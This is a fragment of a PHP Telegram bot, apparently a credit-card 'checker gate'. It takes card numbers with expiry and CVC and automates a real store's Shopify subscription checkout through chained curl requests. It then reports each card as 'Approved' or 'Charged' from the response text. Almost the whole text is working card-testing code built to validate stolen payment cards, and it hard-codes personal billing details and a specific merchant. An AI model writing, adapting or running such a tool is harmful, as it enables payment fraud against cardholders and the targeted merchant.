...
if(cCmd($msg['text'], ['/de', '/De', '/dE', '/DE', '!de', '!De', '!dE', '!DE', '.de', '.DE', '.dE', '.De'])){
...
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/de cc|month|year|cvc</code>",
...
$qu = 82;
/*=====  url  ======*/
$site = "https://www.trxtraining.com/pages/subscriptions";
$url = explode("/", $site)[2];
/*=====  1REQ  ======*/
$ch = curl_init();
...
curl_setopt($ch, CURLOPT_URL, "https://$url/cart/add.js");
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'items%5B0%5D%5Bid%5D=40496885596300&items%5B0%5D%5Bquantity%5D=1&items%5B0%5D%5Bselling_plan%5D=663158924');
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout=&updates%5B%5D=1&checkout=');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r2 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=sachiopremiun@gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Sachio&checkout%5Bbilling_address%5D%5Blast_name%5D=YT&checkout%5Bbilling_address%5D%5Baddress1%5D=118+W+132nd+St&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=New+York&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10027&checkout%5Bbilling_address%5D%5Bphone%5D=19006318646&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Sachio&checkout%5Bbilling_address%5D%5Blast_name%5D=YT&checkout%5Bbilling_address%5D%5Baddress1%5D=118+W+132nd+St&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=New+York&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10027&checkout%5Bbilling_address%5D%5Bphone%5D=19006318646&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r4 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r6 = curl_exec($ch);
$id = trim(strip_tags(capture($r6, '"id":"','"')));
if(empty($id)){
$retry++;
goto start;
}
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv1.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=69589926028&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B19006318646&checkout%5Bsubscription_agreement%5D=0&checkout%5Bsubscription_agreement%5D=1&checkout%5Btotal_price%5D=0&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r7 = curl_exec($ch);
sleep(5);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r8 = curl_exec($ch);
$msg2 = trim(strip_tags(capture($r8, '<p class="notice__text">','</p></div></div>')));
...
if((strpos($r8, "$checkout/thank_you"))){
$status = "Approved! ✅ -» Approved";
$status1 = "Subscription Approved!";
}
elseif(strpos($r8, 'Your order is confirmed')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Your order is confirmed -» ".$charged."";
}
elseif(strpos($r8, 'Thanks Sachio YT!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thanks -» ".$charged."";
}
elseif(strpos($r8, 'Thank you for your order')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for your order -» ".$charged."";
}
elseif(strpos($r8, 'Thanks for Your Order')){
$status = "Approved! ✅ -» Charged!";
...
elseif(strpos($r8, 'Thank you for order!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for order! -» ".$charged."";
}
elseif(strpos($r8, 'Thank you for your purchase!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thank you for your purchase! -» ".$charged."";
}
elseif(strpos($r8, 'Thanks for your purchase!')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Thanks for your purchase! -» ".$charged."";
}
elseif(strpos($r8, 'Your order is on the way')){
$status = "Approved! ✅ -» Charged!";
$status1 = "Your order is on the way -» ".$charged."";
}
elseif((strpos($r8, "$checkout/post_purchase"))){
$status = "Approved! ✅ -» Approved";
$status1 = "Subscription Approved!";
}
